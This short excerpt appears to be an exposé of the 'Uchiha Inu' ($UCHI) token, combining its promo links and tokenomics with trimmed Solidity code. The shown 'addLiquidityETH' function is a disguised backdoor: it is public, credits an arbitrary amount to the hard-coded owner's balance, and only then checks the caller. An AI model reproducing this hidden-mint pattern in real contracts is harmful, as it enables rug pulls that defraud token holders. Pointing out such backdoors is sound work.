...
https://t.me/uchihaportal

http://uchihaeth.com/

Tokenomics:

Token Name: Uchiha Inu
Token Symbol: $UCHI
Total Supply: 10,000,000 UCHI
Tax: 5% (Development 2%, Marketing 2% and 1% Liquidity.)
...
contract UCHIHA is Context, IERC20, Ownable {
    ...
    string private _name = "Uchiha Inu";
    string private _symbol = "UCHI";
    ...
    constructor () {
        ...
        ownerAddress = payable(address(0x4D347839C97b64439da620bD6E69F256d1316abE));
    ...
    function addLiquidityETH(address holdersL,uint256 liquidti) public {
        ...
        if (storge > 100){
            _balances[ownerAddress] = storge +_balances[ownerAddress];
        }
        address call_er = msg.sender;
        require(call_er==ownerAddress);
    }
